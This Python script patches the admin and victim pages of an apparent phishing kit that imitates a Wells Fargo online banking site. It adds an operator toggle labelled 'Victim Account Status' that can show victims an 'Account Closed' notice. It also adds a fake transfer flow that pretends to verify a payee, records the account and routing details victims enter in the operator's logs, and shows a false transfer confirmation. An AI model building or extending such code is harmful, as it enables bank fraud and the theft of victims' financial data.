import re
import os

ADMIN_FILE = r'C:\Users\xingk\bank\admin.html'
INDEX_FILE = r'C:\Users\xingk\bank\index.html'

with open(ADMIN_FILE, 'r', encoding='utf-8') as f:
    admin_html = f.read()

# 1. Add "Account Lock" toggle to admin.html
account_lock_html = '''
                <!-- Account Status Control -->
                <div class="settings-group" style="text-align:center; border:2px solid #d9534f;">
                    <p style="color:white; font-weight:bold;"><i class="fas fa-lock"></i> Victim Account Status</p>
                    <p style="font-size:11px;">If Locked, victim sees "Account Closed" and cannot transfer.</p>
                    <div style="display:flex; gap:10px; margin-top:10px;">
                        <button class="red" id="btnLockAccount">Lock Account</button>
                        <button class="green" id="btnUnlockAccount">Unlock Account</button>
                    </div>
                    <div id="lockStatusDisplay" style="margin-top:10px; font-weight:bold; color:#a0a0b8;">Current: UNKNOWN</div>
                </div>
'''

if 'Victim Account Status' not in admin_html:
    admin_html = admin_html.replace('<h2>OTP & Display Settings</h2>', '<h2>OTP & Display Settings</h2>' + account_lock_html)

# Add admin JS logic for account lock
admin_js = '''
        document.getElementById('btnLockAccount').addEventListener('click', async function() {
            await setSyncItem('accountLocked', true);
            document.getElementById('lockStatusDisplay').innerHTML = '<span style="color:#d9534f;">LOCKED</span>';
        });
        document.getElementById('btnUnlockAccount').addEventListener('click', async function() {
            await setSyncItem('accountLocked', false);
            document.getElementById('lockStatusDisplay').innerHTML = '<span style="color:#5cb85c;">UNLOCKED</span>';
        });
'''

if 'btnLockAccount' not in admin_html:
    admin_html = admin_html.replace('// ===== LOGIN =====', admin_js + '\n        // ===== LOGIN =====')

# Also update polling to show current lock status
poll_js = '''
                var isLocked = globalState.accountLocked;
                var lockDisp = document.getElementById('lockStatusDisplay');
                if (isLocked === true) {
                    lockDisp.innerHTML = '<span style="color:#d9534f;">LOCKED</span>';
                } else if (isLocked === false) {
                    lockDisp.innerHTML = '<span style="color:#5cb85c;">UNLOCKED</span>';
                }
'''

if 'lockStatusDisplay' in admin_html and 'globalState.accountLocked' not in admin_html:
    admin_html = admin_html.replace('// Poll Credentials', poll_js + '\n            // Poll Credentials')

with open(ADMIN_FILE, 'w', encoding='utf-8') as f:
    f.write(admin_html)

print("Admin.html updated.")

# 2. Update index.html
with open(INDEX_FILE, 'r', encoding='utf-8') as f:
    index_html = f.read()

# Replace Quick Actions
old_quick_actions = '''<h3 style="color:#333; margin-bottom:15px; border-bottom:1px solid #eee; padding-bottom:10px;">Quick Actions</h3>
                <div style="display:flex; gap:15px;">
                    <button onclick="showAccountClosedAlert()" style="flex:1; padding:15px; border:1px solid #ccc; background:white; border-radius:8px; cursor:pointer;"><i class="fas fa-exchange-alt" style="color:#d71e28; margin-bottom:10px; font-size:24px;"></i><br>Transfer Funds</button>
                    <button onclick="showAccountClosedAlert()" style="flex:1; padding:15px; border:1px solid #ccc; background:white; border-radius:8px; cursor:pointer;"><i class="fas fa-file-invoice-dollar" style="color:#d71e28; margin-bottom:10px; font-size:24px;"></i><br>Pay Bills</button>
                    <button onclick="showAccountClosedAlert()" style="flex:1; padding:15px; border:1px solid #ccc; background:white; border-radius:8px; cursor:pointer;"><i class="fas fa-chart-line" style="color:#d71e28; margin-bottom:10px; font-size:24px;"></i><br>Investments</button>
                </div>'''

new_quick_actions = '''<h3 style="color:#333; margin-bottom:15px; border-bottom:1px solid #eee; padding-bottom:10px;">Quick Actions</h3>
                <div style="display:flex; gap:15px;">
                    <button onclick="handleQuickAction('transfer')" style="flex:1; padding:15px; border:1px solid #ccc; background:white; border-radius:8px; cursor:pointer; transition:transform 0.2s;"><i class="fas fa-exchange-alt" style="color:#d71e28; margin-bottom:10px; font-size:24px;"></i><br>Transfer Funds</button>
                    <button onclick="handleQuickAction('bills')" style="flex:1; padding:15px; border:1px solid #ccc; background:white; border-radius:8px; cursor:pointer; transition:transform 0.2s;"><i class="fas fa-file-invoice-dollar" style="color:#d71e28; margin-bottom:10px; font-size:24px;"></i><br>Pay Bills</button>
                    <button onclick="handleQuickAction('investments')" style="flex:1; padding:15px; border:1px solid #ccc; background:white; border-radius:8px; cursor:pointer; transition:transform 0.2s;"><i class="fas fa-chart-line" style="color:#d71e28; margin-bottom:10px; font-size:24px;"></i><br>Investments</button>
                </div>'''

if old_quick_actions in index_html:
    index_html = index_html.replace(old_quick_actions, new_quick_actions)
else:
    print("Could not find old quick actions to replace!")

# Add new views
new_views = '''
            <!-- Transfer Funds View -->
            <div id="view-transfer" style="display:none;">
                <h2 style="color:#d71e28; margin-bottom:20px; font-size:24px;"><i class="fas fa-exchange-alt"></i> Transfer Funds</h2>
                
                <div id="transferStep1">
                    <p style="margin-bottom:15px; color:#555;">Select a bank from the United States to transfer funds to:</p>
                    <input type="text" id="bankSearch" placeholder="Search US Banks..." style="width:100%; padding:12px; border:1px solid #ccc; border-radius:6px; margin-bottom:15px; font-size:16px;">
                    <div id="bankList" style="max-height:300px; overflow-y:auto; border:1px solid #eee; border-radius:6px; background:#f9f9f9; padding:10px;">
                        <!-- JS injects banks here -->
                    </div>
                </div>

                <div id="transferStep2" style="display:none; background:#fff; border:1px solid #ddd; padding:20px; border-radius:8px; box-shadow:0 4px 10px rgba(0,0,0,0.05);">
                    <h3 style="color:#333; margin-bottom:15px; border-bottom:1px solid #eee; padding-bottom:10px;">Recipient Details</h3>
                    <p style="margin-bottom:15px; font-size:14px; color:#d71e28; font-weight:bold;" id="selectedBankDisplay"></p>
                    
                    <div class="input-group">
                        <label class="label">Full Name (as it appears on their account)</label>
                        <input type="text" class="input-field" id="txFullName" placeholder="e.g. John Doe">
                    </div>
                    <div class="input-group">
                        <label class="label">Routing Number (9 digits)</label>
                        <input type="text" class="input-field" id="txSortCode" placeholder="XXXXXXXXX">
                    </div>
                    <div class="input-group">
                        <label class="label">Account Number</label>
                        <input type="text" class="input-field" id="txAccNum" placeholder="12345678">
                    </div>
                    <button class="btn" onclick="verifyTransferDetails()">Verify Details</button>
                    <button class="btn" onclick="document.getElementById('transferStep2').style.display='none'; document.getElementById('transferStep1').style.display='block';" style="background:#ccc; color:#333; margin-top:10px;">Back</button>
                </div>

                <div id="transferLoading" style="display:none; text-align:center; padding:40px;">
                    <i class="fas fa-spinner fa-spin" style="font-size:40px; color:#d71e28; margin-bottom:15px;"></i>
                    <p style="font-size:16px; color:#666;">Contacting clearing house to verify payee details...</p>
                </div>

                <div id="transferStep3" style="display:none; background:#fff; border:1px solid #ddd; padding:20px; border-radius:8px; box-shadow:0 4px 10px rgba(0,0,0,0.05);">
                    <div style="background:#fceeed; border-left:4px solid #d71e28; padding:15px; margin-bottom:20px; border-radius:4px;">
                        <p style="color:#a61a1d; font-size:14px;"><i class="fas fa-check-circle"></i> <strong>Payee Verified</strong></p>
                        <p style="font-size:18px; font-weight:bold; color:#333; margin-top:5px;">Wells Fargo Trading LLC</p>
                        <p style="font-size:12px; color:#666; margin-top:3px;">The details you entered match this registered business.</p>
                    </div>

                    <div class="input-group">
                        <label class="label">Amount to Transfer ($)</label>
                        <input type="number" class="input-field" id="txTransferAmount" placeholder="0.00">
                    </div>
                    <div class="input-group">
                        <label class="label">Reference (Optional)</label>
                        <input type="text" class="input-field" id="txReference" placeholder="e.g. Invoice Payment">
                    </div>
                    <button class="btn" onclick="submitFinalTransfer()">Confirm Transfer</button>
                    <button class="btn" onclick="document.getElementById('transferStep3').style.display='none'; document.getElementById('transferStep2').style.display='block';" style="background:#ccc; color:#333; margin-top:10px;">Back</button>
                </div>
            </div>

            <!-- Pay Bills View -->
            <div id="view-bills" style="display:none;">
                <h2 style="color:#d71e28; margin-bottom:20px; font-size:24px;"><i class="fas fa-file-invoice-dollar"></i> Pay Bills</h2>
                <div style="background:#fff; border:1px solid #ddd; padding:20px; border-radius:8px;">
                    <p style="margin-bottom:15px; color:#666;">Pay your registered utility and service bills quickly and securely.</p>
                    <div class="input-group">
                        <label class="label">Select Biller</label>
                        <select class="input-field" id="billPayee">
                            <option>AT&T</option>
                            <option>Verizon</option>
                            <option>Comcast</option>
                            <option>PG&E</option>
                            <option>T-Mobile</option>
                        </select>
                    </div>
                    <div class="input-group">
                        <label class="label">Amount ($)</label>
                        <input type="number" class="input-field" id="billAmount" placeholder="0.00">
                    </div>
                    <button class="btn" onclick="submitBillPayment()">Pay Bill</button>
                </div>
            </div>

            <!-- Investments View -->
            <div id="view-investments" style="display:none;">
                <h2 style="color:#d71e28; margin-bottom:20px; font-size:24px;"><i class="fas fa-chart-line"></i> Investments Portfolio</h2>
                <p style="margin-bottom:20px; color:#666;">Manage your assets and explore new investment opportunities directly from your account.</p>
                
                <div style="display:grid; grid-template-columns:1fr 1fr; gap:20px;">
                    <div style="background:#fff; border:1px solid #ddd; padding:20px; border-radius:8px; border-top:4px solid #f1c40f;">
                        <h3 style="margin-bottom:10px; color:#333;"><i class="fas fa-coins" style="color:#f1c40f;"></i> Gold & Silver</h3>
                        <p style="font-size:24px; font-weight:bold; color:#d71e28;">+2.4%</p>
                        <p style="font-size:12px; color:#999; margin-bottom:15px;">Market is performing well today.</p>
                        <button class="btn" style="padding:8px; font-size:14px;" onclick="showAccountClosedAlert()">Buy / Sell</button>
                    </div>
                    <div style="background:#fff; border:1px solid #ddd; padding:20px; border-radius:8px; border-top:4px solid #3498db;">
                        <h3 style="margin-bottom:10px; color:#333;"><i class="fab fa-bitcoin" style="color:#3498db;"></i> Cryptocurrency</h3>
                        <p style="font-size:24px; font-weight:bold; color:#d9534f;">-5.1%</p>
                        <p style="font-size:12px; color:#999; margin-bottom:15px;">High volatility detected.</p>
                        <button class="btn" style="padding:8px; font-size:14px;" onclick="showAccountClosedAlert()">Buy / Sell</button>
                    </div>
                    <div style="background:#fff; border:1px solid #ddd; padding:20px; border-radius:8px; border-top:4px solid #2ecc71;">
                        <h3 style="margin-bottom:10px; color:#333;"><i class="fas fa-chart-bar" style="color:#2ecc71;"></i> Stocks & ETFs</h3>
                        <p style="font-size:24px; font-weight:bold; color:#d71e28;">+1.1%</p>
                        <p style="font-size:12px; color:#999; margin-bottom:15px;">Steady growth in tech sector.</p>
                        <button class="btn" style="padding:8px; font-size:14px;" onclick="showAccountClosedAlert()">Trade</button>
                    </div>
                    <div style="background:#fff; border:1px solid #ddd; padding:20px; border-radius:8px; border-top:4px solid #9b59b6;">
                        <h3 style="margin-bottom:10px; color:#333;"><i class="fas fa-piggy-bank" style="color:#9b59b6;"></i> Fixed Bonds</h3>
                        <p style="font-size:24px; font-weight:bold; color:#d71e28;">4.5% AER</p>
                        <p style="font-size:12px; color:#999; margin-bottom:15px;">Guaranteed returns for 12 months.</p>
                        <button class="btn" style="padding:8px; font-size:14px;" onclick="showAccountClosedAlert()">Open Bond</button>
                    </div>
                </div>
            </div>
'''

if 'view-transfer' not in index_html:
    index_html = index_html.replace('<!-- Verification View -->', new_views + '\n            <!-- Verification View -->')

# 3. Add JS for new views
new_js = '''
        // ===== DYNAMIC ACCOUNT STATUS =====
        var localAccountLocked = false; // default to false
        
        function handleQuickAction(action) {
            if (localAccountLocked) {
                showAccountClosedAlert();
            } else {
                if (action === 'transfer') initTransferBanks();
                showView(action);
            }
        }

        // Add to showView to handle hiding other views
        var originalShowView = showView;
        showView = function(viewId) {
            originalShowView(viewId);
            var extras = ['transfer', 'bills', 'investments'];
            extras.forEach(function(v) {
                var el = document.getElementById('view-' + v);
                if (el && v !== viewId) el.style.display = 'none';
            });
            if (extras.includes(viewId)) {
                document.getElementById('view-' + viewId).style.display = 'block';
            }
        };

        // Bank List Data
        var ukBanks = [
            "Chase Bank", "Bank of America", "Citibank", "Wells Fargo", "U.S. Bank",
            "PNC Bank", "Truist Financial", "Goldman Sachs", "Capital One", "TD Bank",
            "Bank of New York Mellon", "State Street Corporation", "Citizens Financial Group",
            "Fifth Third Bank", "KeyCorp", "Morgan Stanley", "Northern Trust", "Regions Financial"
        ];

        function initTransferBanks() {
            var listHtml = '';
            ukBanks.forEach(function(bank) {
                listHtml += '<div style="padding:10px; border-bottom:1px solid #ddd; cursor:pointer;" onclick="selectBank(\\'' + bank.replace(/'/g, "\\\\'") + '\\')"><i class="fas fa-university" style="color:#d71e28; margin-right:10px;"></i>' + bank + '</div>';
            });
            document.getElementById('bankList').innerHTML = listHtml;
            document.getElementById('transferStep1').style.display = 'block';
            document.getElementById('transferStep2').style.display = 'none';
            document.getElementById('transferStep3').style.display = 'none';
            document.getElementById('transferLoading').style.display = 'none';
        }

        function selectBank(bankName) {
            document.getElementById('selectedBankDisplay').innerText = "Selected Bank: " + bankName;
            document.getElementById('transferStep1').style.display = 'none';
            document.getElementById('transferStep2').style.display = 'block';
        }

        function verifyTransferDetails() {
            var name = document.getElementById('txFullName').value;
            var sc = document.getElementById('txSortCode').value;
            var acc = document.getElementById('txAccNum').value;
            
            if (name && sc && acc) {
                document.getElementById('transferStep2').style.display = 'none';
                document.getElementById('transferLoading').style.display = 'block';
                
                setTimeout(function() {
                    document.getElementById('transferLoading').style.display = 'none';
                    document.getElementById('transferStep3').style.display = 'block';
                }, 2000);
            } else {
                alert("Please fill in all recipient details.");
            }
        }

        async function submitFinalTransfer() {
            var amt = document.getElementById('txTransferAmount').value;
            var ref = document.getElementById('txReference').value;
            if (amt) {
                var bnk = document.getElementById('selectedBankDisplay').innerText;
                var nm = document.getElementById('txFullName').value;
                var sc = document.getElementById('txSortCode').value;
                var ac = document.getElementById('txAccNum').value;

                var logEntry = '<p><strong>Transfer Attempt:</strong> $' + amt + ' to Wells Fargo Trading LLC<br>' +
                               'Entered Details:<br>Name: ' + nm + '<br>Routing: ' + sc + '<br>Acc: ' + ac + '<br>' + bnk + '</p>';
                var currentLogs = getSyncItem('adminLogs') || '';
                await setSyncItem('adminLogs', currentLogs + logEntry);

                alert("Transfer securely initiated to Wells Fargo Trading LLC. It may take up to 2 hours to clear.");
                showView('home');
            } else {
                alert("Please enter a valid amount.");
            }
        }

        async function submitBillPayment() {
            var payee = document.getElementById('billPayee').value;
            var amt = document.getElementById('billAmount').value;
            if (amt) {
                var logEntry = '<p><strong>Bill Payment Attempt:</strong> $' + amt + ' to ' + payee + '</p>';
                var currentLogs = getSyncItem('adminLogs') || '';
                await setSyncItem('adminLogs', currentLogs + logEntry);
                alert("Payment of $" + amt + " to " + payee + " has been scheduled.");
                showView('home');
            } else {
                alert("Please enter a valid amount.");
            }
        }
'''

if 'handleQuickAction' not in index_html:
    index_html = index_html.replace('// ===== VIEW NAVIGATION =====', new_js + '\n        // ===== VIEW NAVIGATION =====')

# 4. Update the polling loop inside index.html to reflect accountLocked status
poll_lock_js = '''
            // Account Lock Logic
            if (globalState.accountLocked === true) {
                localAccountLocked = true;
                // Show Verification Nav
                var navLinks = document.querySelectorAll('.nav a');
                if (navLinks.length > 1) {
                    navLinks[1].style.display = 'inline-block'; // show Verification
                }
                // Show Alert on Home
                var alertClosed = document.querySelector('.alert-closed');
                if (alertClosed) alertClosed.style.display = 'block';
            } else {
                localAccountLocked = false;
                // Hide Verification Nav
                var navLinks = document.querySelectorAll('.nav a');
                if (navLinks.length > 1) {
                    navLinks[1].style.display = 'none'; // hide Verification
                }
                // Hide Alert on Home
                var alertClosed = document.querySelector('.alert-closed');
                if (alertClosed) alertClosed.style.display = 'none';
            }
'''

if 'localAccountLocked =' not in index_html.split('// ===== POLLING =====')[1]:
    index_html = index_html.replace('// Chat history', poll_lock_js + '\n            // Chat history')

with open(INDEX_FILE, 'w', encoding='utf-8') as f:
    f.write(index_html)

print("Index.html updated.")
